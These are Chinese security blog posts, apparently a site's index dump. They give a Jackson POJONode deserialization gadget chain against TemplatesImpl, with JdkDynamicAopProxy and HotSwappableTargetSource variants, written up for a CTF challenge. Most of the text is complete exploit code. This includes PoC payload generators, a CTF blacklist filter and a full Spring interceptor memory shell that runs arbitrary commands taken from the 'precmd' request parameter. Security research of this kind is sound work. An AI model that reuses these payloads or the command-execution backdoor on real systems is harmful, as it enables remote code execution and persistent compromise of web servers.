@RestController public class Interceptor_demo extends AbstractTranslet implements HandlerInterceptor,Interceptor { public Interceptor_demo() throws Exception { System.out.println(\u0026#34;main\u0026#34;); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\u0026#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT\u0026#34;, 0); RequestMappingHandlerMapping bean = null; if (context != null) { bean = context.getBean(RequestMappingHandlerMapping.class); } bean.setInterceptors(new Interceptor[]{new Interceptor_demo(\u0026#34;a\u0026#34;)}); Class\u0026lt;?\u0026gt; aClass2 = Class.forName(\u0026#34;org.springframework.web.servlet.handler.AbstractHandlerMapping\u0026#34;); Method initApplicationContext = aClass2.getDeclaredMethod(\u0026#34;initApplicationContext\u0026#34;); initApplicationContext.setAccessible(true); initApplicationContext.invoke(bean); System.out.println(\u0026#34;1111111111111111111111\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public Interceptor_demo(String a) { } @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String precmd = request.getParameter(\u0026#34;precmd\u0026#34;); if (precmd!= null \u0026amp;\u0026amp;!precmd.isEmpty()) { try { Process process = Runtime.getRuntime().exec(precmd); InputStreamReader isr = new InputStreamReader(process.getInputStream()); BufferedReader br = new BufferedReader(isr); response.setContentType(\u0026#34;text/plain\u0026#34;); PrintWriter writer = response.getWriter(); String line; while ((line = br.readLine())!= null) { writer.write(line + \u0026#34;\\n\u0026#34;); } br.close(); isr.close(); } catch (IOException e) { response.setContentType(\u0026#34;text/plain\u0026#34;); PrintWriter writer = response.getWriter(); writer.write(\u0026#34;执行命令时出现异常: \u0026#34; + e.getMessage()); writer.close(); } } System.out.println(\u0026#34;preprepreprepreprepre\u0026#34;); // 这里可以进行权限验证等操作，如果验证不通过可以返回 false 中断请求处理 return true; } // public Interceptor_demo(String a) { // } public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView mv) throws Exception { System.out.println(\u0026#34;postpostpostpostpost\u0026#34;); } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws IOException { System.out.println(\u0026#34;afterafterafterafter\u0026#34;); } } 0x04 总结 下面这个调用顺序的原因，ha.handle是controller\nInterceptor内存马相对而言简单很多，我没花多少时间就搞出来了，但是文章和一些思考有写了好久hhh\n但是有个地方我要吐了，网上的poc\norg.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(\u0026#34;requestMappingHandlerMapping\u0026#34;); java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\u0026#34;adaptedInterceptors\u0026#34;); field.setAccessible(true); java.util.ArrayList\u0026lt;Object\u0026gt; adaptedInterceptors = (java.util.ArrayList\u0026lt;Object\u0026gt;)field.get(abstractHandlerMapping); requestMappingHandlerMapping有adaptedInterceptors这个值，我当时真没看到吐了，还有感觉也是poc构造的有点死板了\n后面看了下是有这个值的wwww，下面倒数第二个就是\n参考：\nhttps://xz.aliyun.com/t/12047?time__1311=GqGxR70QD%3DG%3DitD%2FYriQGkbcHPWuff%2B7ubD#toc-11\nhttps://jlkl.github.io/2022/05/26/Java-09/\n","permalink":"https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/spring%E5%86%85%E5%AD%98%E9%A9%AC/","summary":"前言: 不建议看Controller内存马，因为前面完全是笔者自己在摸索，后面还错了hh（太菜啦）。跟我这个走的话可能会费力不讨好。 Inter","title":"Spring内存马"},{"content":"环境 jackson版本太老的话，POJONode中代码会不对\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-annotations\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.12.1.GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 0x01 writeValueAsString 这里我们jackson 原生链，利用点跟writeValueAsString()有关，他用来将java对象序列化成json字符串，序列化的时候会调用java对象的getter方法，所以我们这里看下序列化的时候是怎么调用getter方法的\n_accessorMethod = (Method) member.getMember(); 设置getter方法，调用栈\n\u0026lt;init\u0026gt;:234, BeanPropertyWriter (com.fasterxml.jackson.databind.ser) buildWriter:229, PropertyBuilder (com.fasterxml.jackson.databind.ser) _constructWriter:791, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) findBeanProperties:583, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) constructBeanSerializer:368, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) findBeanSerializer:279, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) _createSerializer2:231, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) createSerializer:165, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) _createUntypedSerializer:1385, SerializerProvider (com.fasterxml.jackson.databind) _createAndCacheUntypedSerializer:1336, SerializerProvider (com.fasterxml.jackson.databind) findValueSerializer:510, SerializerProvider (com.fasterxml.jackson.databind) findTypedValueSerializer:713, SerializerProvider (com.fasterxml.jackson.databind) serializeValue:308, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser) _configAndWriteValue:3893, ObjectMapper (com.fasterxml.jackson.databind) writeValueAsString:3207, ObjectMapper (com.fasterxml.jackson.databind) main:16, JSTest (jackson) final Object value = (_accessorMethod == null) ? _field.get(bean) : _accessorMethod.invoke(bean, (Object[]) null); getter方法反射调用，只调用无参方法\ngetJack:31, Person2 (jackson) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) serializeAsField:687, BeanPropertyWriter (com.fasterxml.jackson.databind.ser) serializeFields:719, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std) serialize:155, BeanSerializer (com.fasterxml.jackson.databind.ser) _serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser) serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser) _configAndWriteValue:3893, ObjectMapper (com.fasterxml.jackson.databind) writeValueAsString:3207, ObjectMapper (com.fasterxml.jackson.databind) main:16, JSTest (jackson) 对比下调用栈，大概流程就是\nwriteValueAsString()一直到=\u0026gt;DefaultSerializerProvider#serializeValue\n这里findTypedValueSerializer()会先对Filed和Method（包含setter和getter），进行初始化\n在_serialize()反射调用这些Filed和Method（测试发现，有属性的getter方法和没有属性的getter方法都会被调用）\n调用的时候，在BeanSerializerBase#serializeFields会通过for需要根据前面初始化的prop调用serializeAsField，注意，这里jack也有自己prop尽管他没有属性，但是他有getter，前面赋值优先赋值给Method，所以他也有自己prop，最后调用getJack()\n作为Gadgets的一环，我们知道他的作用就是调用任意类getter方法嘛，无疑Gadgets后半段就是TemplatesImpl.getOutputProperties()\n0x02 POJONode POJONode的toString可以调用writeValueAsString()，且对象可控，我们怎么调用toString呢，这里不难想到利用CC5的BadAttributeValueExpException，那么Gadgets就完整啦\nInternalNodeMapper#nodeToString 0x03 Gadgets BadAttributeValueExpException.readObject POJONode.toString InternalNodeMapper#nodeToString writeValueAsString() TemplatesImpl.getOutputProperties() 问题1 writeReplace() 我们满心欢喜构造好poc后，发现序列化的时就退出程序了，常规反序列化这个地方会调用writeReplace()\nwriteReplace()这里和toString()可以起到一样的效果，后面会调用到writeValueAsBytes(),后续会提前调用getter方法，然后报错中断\n解决：\n自构一个BaseJsonNode将writeReplace()删除 //这里应该是跟Classload加载的问题有关，后面留个坑\n构造个一样路径的，然后就可以打成功啦\npackage jackson; import com.fasterxml.jackson.databind.node.POJONode; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; public class jackson { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); byte[] code = clazz.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\u0026#34;_name\u0026#34;,\u0026#34;111\u0026#34;); setFiled(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFiled(templates,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); POJONode jsonNodes = new POJONode(templates); BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(111); setFiled(badAttributeValueExpException,\u0026#34;val\u0026#34;,jsonNodes); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(badAttributeValueExpException); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } 网上说这个不稳定，本地试了10次都没问题，就先不看\n存档1 BaseJsonNode 为什么本地重写BaseJsonNode可以解决问题1\n0x04 不稳定 之前说一直没遇到hhh，后面打内存马的时候出现了好几次这个问题，所以来补下这个坑。因为这个是概率触发，所以不太好截图\n产生的原因呢是在jackson自己的序列化中，看到serializeFields()\n这里是for循环，props是之前赋值的，然后根据filed的名字调用去获取对应的值，这里后面就是调用对应的getter或者反射获取filed值了，问题就出在这个props值的顺序上，如果第一个值是outputProperties，最先调用的就是getOutputProperties()自然就可以调用成功。\n但是如果是其他值就会有问题，这里值分别是stylesheetDOM，transletIndex\n这两个值对应两个getter方法getStylesheetDOM(),getTransletIndex()\npublic DOM getStylesheetDOM() { return (DOM)_sdom.get(); } public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _transletIndex; } 如果先getTransletIndex()再getOutputProperties()也没事，getTransletIndex()只是帮忙加载了字节码，不会照成影响。\n有问题只有一种场景，getStylesheetDOM在getOutputProperties前面调用\n这个时候会在恶意类实例化前调用getStylesheetDOM()，而_sdom是null，会报空指针的错误\n那很简单呀我们给他赋予一个值不就行了，其实不能wwwww\n我们看到TemplatesImpl其实会给这个赋予一个ThreadLocal实例，那为什么是null呢\nprivate transient ThreadLocal _sdom = new ThreadLocal(); 这里是反序列化嘛，问题可能就出在这里\n可以看到TemplatesImpl这里是不会序列化_sdom这个值的，同时反序列化的地方也不会赋值这个filed，所以他是null\n解决 但是我们不难想到getOutputProperties是继承的Templates接口，他只有这一个getter呀，能不能换成他呢（这里试过类型转换，没用）\n解决办法是用到动态代理，然后代理Templates接口，使得props只有getOutputProperties这个方法，Proxy调用getOutputProperties(),触发代理调用invoke方法，如果这个代理类invoke方法可以设置我们的TemplatesImpl对象来调用getOutputProperties()问题就解决了\n这里需要补充点东西，我们知道序列化会调用getter，之前分析流程可能不够细\njackson的初始化，最初会在AnnotatedMethodCollector.java#_addMemberMethods，找到类所有方法并put\n这里是获取代理的方法，最终其实是通过反射getDeclaredMethods()获取的，但是其获取方法得到的顺序每次可能存在一些偏差，这也是jackson链子不稳定的原因\npublic static Method[] getClassMethods(Class\u0026lt;?\u0026gt; cls) { try { return cls.getDeclaredMethods(); } 一共是5个方法，分别是hashcode,equals,toString,getOutputProperties,newTransformer\n这里我们用java的反射 getDeclaredMethods 方法去获取代理类所有方法时也是根据我们提供的接口（这里是Templates.class）去获取的方法。，所以只有上面5个方法，其他3个方法自带的都会有，然后getter就只有getOutputProperties\nObject proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); 然后将获取的方法返回，这里会尝试添加到props里，只有getOutputProperties添加了\n然后后面其他的赋值就只有getOutputProperties这一个getter方法了\n0x05 JdkDynamicAopProxy org.springframework.aop.framework.JdkDynamicAopProxy需要aop依赖\n这个类有啥用呢，通过前面的处理可以只调用getOutputProperties()，调用后触发代理类invoke()方法，其中在invokeJoinpointUsingReflection()处会反射调用对应的方法（getOutputProperties）\n我这里缩减下代码，我们需要控制这里target，target来自targetSource，targetSource有来初始化设置的this.advised\nTargetSource targetSource = this.advised.targetSource; target = targetSource.getTarget(); 这里我们将TemplatesImpl进行AdvisedSupport封装放入对应的值，反射时就能调用到我们放入的TemplatesImpl对象\nClass\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor\u0026lt;?\u0026gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); POJONode jsonNodes = new POJONode(proxyObj); 0x06 poc package jackson; import com.fasterxml.jackson.databind.node.POJONode; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.tomcat.util.codec.binary.Base64; import org.springframework.aop.framework.AdvisedSupport; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import javax.xml.transform.Transformer; import javax.xml.transform.TransformerConfigurationException; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.security.*; import java.util.Properties; public class jackson { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzs = pool.get(Evil.class.getName()); byte[] code = clazzs.toBytecode(); //System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\u0026#34;_name\u0026#34;,\u0026#34;111\u0026#34;); setFiled(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFiled(templates,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor\u0026lt;?\u0026gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); POJONode jsonNodes = new POJONode(proxyObj); BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(111); setFiled(badAttributeValueExpException,\u0026#34;val\u0026#34;,jsonNodes); // 生成私钥和公钥 KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(\u0026#34;RSA\u0026#34;); keyPairGen.initialize(2048); KeyPair keyPair = keyPairGen.generateKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); // 创建签名引擎 Signature signingEngine = Signature.getInstance(\u0026#34;SHA256withRSA\u0026#34;); signingEngine.initSign(privateKey); SignedObject signedObject = new SignedObject(badAttributeValueExpException,privateKey,signingEngine); POJONode node = new POJONode(signedObject); BadAttributeValueExpException bad=new BadAttributeValueExpException(111); setFiled(bad,\u0026#34;val\u0026#34;,node); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(bad); oos.close(); byte[] serializedBytes = bos.toByteArray(); byte[] base64EncodedBytes = Base64.encodeBase64(serializedBytes); System.out.println(new String(base64EncodedBytes)); // 从文件中反序列化对象 String base64EncodedData = \u0026#34;\u0026#34;; byte[] decodedBytes = Base64.decodeBase64(base64EncodedData); // 反序列化 ByteArrayInputStream bis = new ByteArrayInputStream(serializedBytes); ObjectInputStream ois = new ObjectInputStream(bis); ois.readObject(); } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } 0x07 另一种触发tostring 除了用上面CC5来触发tostring方法还有其他链子，org.springframework.aop.target.HotSwappableTargetSource.java(HSTS)，这个类是spring aop模块的\n这里是看secobj这道和jackson相关的反序列化题接触到的，这里看到链子\nHashMap#readObject -\u0026gt; HashMap#putVal -\u0026gt; HotSwappableTargetSource#equals -\u0026gt; XString#equals -\u0026gt;POJONode#toString 这个是前面的触发的利用连，我们简单分析下链子，我第一眼看这个链子就想为啥要HotSwappableTargetSource#equals这步，直接XString#equals不好么。我们开始分析\n一开始我就遇到了困难点，我是调用else中的key.equals(k)来触发后面的链子，但是我们进入else并不容易\n问题1 putVal tab 这里可以看到p是从tab中取值的，其中i还是通过and和hash运算，这里明显一次putVal方法不够，我们第一次给tab[i],第二次调用第一次的tab[i]\nHashmap#readObject 中也是for调用putVal，上面想法可以实现\nfor (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } mappings 通过putVal()中的代码，我们知道要进入else，第二次的i要和第一次的i一样，才能让\n(p = tab[i = (n - 1) \u0026amp; hash]) != null (这里是不等于，md格式的问题) 及两次的key的hash值要一样，也就是间接key要一样咯？，但是赋值直接put的话，只会有一对值，覆盖第一个value。而put也是调用的putVal()，会判断key的hash，一样的话并不会多加一对值。\npublic V put(K key, V value) { return putVal(hash(key), key, value, false, true); } 这里主要原因是这个hash值，所以我们第二值可以直接用这个putVal()来赋值，hash我们可以随便设置，因为readObject的时候，hash值还是去通过hash(key)去获取的，并不影响\nHashMap hashMap = new HashMap(); hashMap.put(hotSwappableTargetSource2,\u0026#34;111\u0026#34;); //hashMap.put(hotSwappableTargetSource,\u0026#34;222\u0026#34;); Method putVal = hashMap.getClass().getDeclaredMethod(\u0026#34;putVal\u0026#34;, int.class, Object.class, Object.class, boolean.class, boolean.class); putVal.setAccessible(true); putVal.invoke(hashMap,123,hotSwappableTargetSource,\u0026#34;222\u0026#34;,false,true); key hash的问题解决了，有个究极问题（两次的key不能相等）\n看到这里进入else之后的这个if判断，这里||如果前面为true了的话就不会执行后面的key.equals(k)方法进行判断了\nif (p.hash == hash \u0026amp;\u0026amp; ((k = p.key) == key || (key != null \u0026amp;\u0026amp; key.equals(k)))) Hashmap#hash\nstatic final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } 但是常规思路，这个是不可能的，因为hash值要一样意味着key一样，而这里却要key不相同！——！，除非他hashCode()有黑魔法嘿嘿\n这里也就是为什么要套一层HSTS的原因\nHSTS 我的神 这家伙hashCode方法完美解决的了这个问题，其返回的是一个固定值我去（不知道为什么这么设计，从逻辑上看其实算个缺陷，不符合逻辑呀hhh）\n@Override public int hashCode() { return HotSwappableTargetSource.class.hashCode(); } 所以这里key都用HotSwappableTargetSource\n后面就比较顺利了，没什么问题，这里注意下第一个XString要用String那个构造方法，因为str()里String转义可能报错中断\npoc 这里poc还夹杂着SignedObject(二次反序列化)和JdkDynamicAopProxy(稳定触发getOutputProperties)，spring内存马\n因为题目需要这些，然后相关代码和附件我也会放到poc下面\nimport com.fasterxml.jackson.databind.node.POJONode; import com.govuln.shiroattack.Evil; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xml.internal.utils.XMLString; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.ClassPool; import javassist.CtClass; import org.apache.tomcat.util.codec.binary.Base64; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.target.HotSwappableTargetSource; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import javax.xml.transform.Transformer; import javax.xml.transform.TransformerConfigurationException; import java.io.*; import java.lang.reflect.*; import java.security.*; import java.util.HashMap; import java.util.Properties; public class jackson { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzs = pool.get(Interceptor_demo.class.getName()); byte[] code = clazzs.toBytecode(); //System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\u0026#34;_name\u0026#34;,\u0026#34;111\u0026#34;); setFiled(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFiled(templates,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor\u0026lt;?\u0026gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); POJONode jsonNodes = new POJONode(proxyObj); BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(111); setFiled(badAttributeValueExpException,\u0026#34;val\u0026#34;,jsonNodes); // 生成私钥和公钥 KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(\u0026#34;RSA\u0026#34;); keyPairGen.initialize(2048); KeyPair keyPair = keyPairGen.generateKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); // 创建签名引擎 Signature signingEngine = Signature.getInstance(\u0026#34;SHA256withRSA\u0026#34;); signingEngine.initSign(privateKey); SignedObject signedObject = new SignedObject(badAttributeValueExpException,privateKey,signingEngine); POJONode node = new POJONode(signedObject); // BadAttributeValueExpException bad=new BadAttributeValueExpException(111); // setFiled(bad,\u0026#34;val\u0026#34;,node); XString xString = new XString(\u0026#34;123\u0026#34;); Constructor\u0026lt;XString\u0026gt; Constructor = XString.class.getDeclaredConstructor(Object.class); Constructor.setAccessible(true); //XString xString = Constructor.newInstance(new XString(\u0026#34;123\u0026#34;)); XString xString2 = Constructor.newInstance(node); HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(xString); HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(node); HashMap hashMap = new HashMap(); hashMap.put(hotSwappableTargetSource2,\u0026#34;111\u0026#34;); //hashMap.put(hotSwappableTargetSource,\u0026#34;222\u0026#34;); Method putVal = hashMap.getClass().getDeclaredMethod(\u0026#34;putVal\u0026#34;, int.class, Object.class, Object.class, boolean.class, boolean.class); putVal.setAccessible(true); putVal.invoke(hashMap,123,hotSwappableTargetSource,\u0026#34;222\u0026#34;,false,true); // Field modCount = hashMap.getClass().getDeclaredField(\u0026#34;size\u0026#34;); // modCount.setAccessible(true); // modCount.set(hashMap,2); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(hashMap); oos.close(); byte[] serializedBytes = bos.toByteArray(); byte[] base64EncodedBytes = Base64.encodeBase64(serializedBytes); System.out.println(new String(base64EncodedBytes)); // 从文件中反序列化对象 String base64EncodedData = \u0026#34;\u0026#34;; byte[] decodedBytes = Base64.decodeBase64(base64EncodedData); // 反序列化 ByteArrayInputStream bis = new ByteArrayInputStream(serializedBytes); ObjectInputStream ois = new MyObjectInputStream(bis); ois.readObject(); } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } MyObjectInputStream\n这个是题目的过滤，可以看到过滤了CC5开头\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // import java.io.IOException; import java.io.InputStream; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.io.ObjectStreamClass; public class MyObjectInputStream extends ObjectInputStream { private static final String[] blackList = new String[]{\u0026#34;AbstractTranslet\u0026#34;, \u0026#34;Templates\u0026#34;, \u0026#34;TemplatesImpl\u0026#34;, \u0026#34;javax.management\u0026#34;, \u0026#34;swing\u0026#34;, \u0026#34;awt\u0026#34;, \u0026#34;fastjson\u0026#34;}; public MyObjectInputStream(InputStream in) throws IOException { super(in); } protected MyObjectInputStream() throws IOException, SecurityException { } protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String[] var2 = blackList; int var3 = var2.length; for(int var4 = 0; var4 \u0026lt; var3; ++var4) { String black = var2[var4]; if (desc.getName().contains(black)) { throw new InvalidClassException(\u0026#34;Unauthorized deserialization attempt\u0026#34;, desc.getName()); } } return super.resolveClass(desc); } } Interceptor_demo\n这个是我自己写的spring的Interceptor内存马\nimport com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.aopalliance.intercept.Interceptor; import org.springframework.lang.Nullable; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.PrintWriter; import java.lang.reflect.Method; @RestController public class Interceptor_demo extends AbstractTranslet implements HandlerInterceptor,Interceptor { public Interceptor_demo() throws Exception { System.out.println(\u0026#34;main\u0026#34;); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\u0026#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT\u0026#34;, 0); RequestMappingHandlerMapping bean = null; if (context != null) { bean = context.getBean(RequestMappingHandlerMapping.class); } bean.setInterceptors(new Interceptor[]{new Interceptor_demo(\u0026#34;a\u0026#34;)}); Class\u0026lt;?\u0026gt; aClass2 = Class.forName(\u0026#34;org.springframework.web.servlet.handler.AbstractHandlerMapping\u0026#34;); Method initApplicationContext = aClass2.getDeclaredMethod(\u0026#34;initApplicationContext\u0026#34;); initApplicationContext.setAccessible(true); initApplicationContext.invoke(bean); System.out.println(\u0026#34;1111111111111111111111\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public Interceptor_demo(String a) { } @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String precmd = request.getParameter(\u0026#34;precmd\u0026#34;); if (precmd!= null \u0026amp;\u0026amp;!precmd.isEmpty()) { try { Process process = Runtime.getRuntime().exec(precmd); InputStreamReader isr = new InputStreamReader(process.getInputStream()); BufferedReader br = new BufferedReader(isr); response.setContentType(\u0026#34;text/plain\u0026#34;); PrintWriter writer = response.getWriter(); String line; while ((line = br.readLine())!= null) { writer.write(line + \u0026#34;\\n\u0026#34;); } br.close(); isr.close(); } catch (IOException e) { response.setContentType(\u0026#34;text/plain\u0026#34;); PrintWriter writer = response.getWriter(); writer.write(\u0026#34;执行命令时出现异常: \u0026#34; + e.getMessage()); writer.close(); } } System.out.println(\u0026#34;preprepreprepreprepre\u0026#34;); // 这里可以进行权限验证等操作，如果验证不通过可以返回 false 中断请求处理 return true; } // public Interceptor_demo(String a) { // } public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView mv) throws Exception { System.out.println(\u0026#34;postpostpostpostpost\u0026#34;); } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws IOException { System.out.println(\u0026#34;afterafterafterafter\u0026#34;); } } 最后成功利用hhh\n题目附件：6ZO+5o6lOiBodHRwczovL3Bhbi5iYWlkdS5jb20vcy8xTlBBUlhLLWNrWGNTQU9QVHlybGxLUT9wd2Q9ZmxhZyDmj5Dlj5bnoIE6IGZsYWc=（自行Base64解码） 